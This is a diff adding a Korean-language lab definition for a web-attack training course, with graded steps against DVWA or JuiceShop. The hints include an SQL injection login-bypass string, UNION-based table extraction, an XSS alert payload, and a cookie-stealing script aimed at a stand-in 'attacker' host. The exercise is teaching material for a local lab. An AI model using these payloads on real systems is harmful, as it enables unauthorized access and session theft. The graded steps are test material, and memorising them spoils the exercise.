@@ -1,0 +1,70 @@
+lab_id: "battle-nonai-week03"
+title: "웹 공격 기초 — SQL Injection / XSS"
+version: "non-ai"
+course: "battle-nonai"
+week: 3
+description: "웹 애플리케이션의 대표적 취약점인 SQL Injection과 XSS(Cross-Site Scripting)를 직접 실습한다. 수동으로 페이로드를 작성하고 공격 원리를 이해한다."
+difficulty: "medium"
+duration_minutes: 90
+objectives:
+  - "SQL Injection의 원리를 이해하고 수동 공격을 수행할 수 있다"
+  - "Reflected XSS 공격을 실행할 수 있다"
+  - "쿠키 탈취의 위험성을 이해할 수 있다"
+prerequisites:
+  - "HTTP 프로토콜 기초"
+  - "HTML/JavaScript 기본 이해"
+  - "SQL 기본 문법"
+infra_requirements:
+  - "attacker VM (브라우저 + curl)"
+  - "defender VM (DVWA 또는 JuiceShop 구동)"
+pass_threshold: 0.6
+steps:
+  - order: 1
+    instruction: "대상 웹 애플리케이션의 로그인 폼에 SQL Injection 페이로드를 입력하여 인증을 우회하라. 예: 사용자명 필드에 ' OR '1'='1 입력."
+    hint: "curl로 POST 요청을 보내거나 브라우저에서 직접 입력한다. 싱글 쿼트(')로 에러를 유발한 뒤 논리 조건을 조작한다."
+    category: "exploit"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Welcome"
+      field: "stdout"
+
+  - order: 2
+    instruction: "UNION 기반 SQL Injection으로 데이터베이스의 테이블 목록을 추출하라."
+    hint: "ORDER BY로 컬럼 수를 파악한 뒤, UNION SELECT를 이용하여 information_schema.tables를 조회한다."
+    category: "exploit"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "users"
+      field: "stdout"
+
+  - order: 3
+    instruction: "검색 입력란에 Reflected XSS 페이로드를 삽입하여 alert 창을 띄워라."
+    hint: "<script>alert('XSS')</script> 또는 이벤트 핸들러 기반 페이로드를 사용한다."
+    category: "exploit"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "<script>"
+      field: "stdout"
+
+  - order: 4
+    instruction: "XSS를 이용하여 document.cookie 값을 외부 서버로 전송하는 페이로드를 작성하라 (시연용)."
+    hint: "<script>new Image().src='http://attacker/steal?c='+document.cookie</script> 형태를 참고한다. 실제 전송은 로컬 환경에서만 수행한다."
+    category: "exploit"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "document.cookie"
+      field: "stdout"
+
+  - order: 5
+    instruction: "수행한 공격의 페이로드, 결과, 위험도를 정리하여 web_attack_report.txt로 작성하라."
+    hint: "각 공격별로 사용한 페이로드, 성공 여부, OWASP 분류를 기록한다."
+    category: "analysis"
+    points: 10
+    verify:
+      type: "file_exists"
+      expect: "web_attack_report.txt"
+      field: "filesystem"
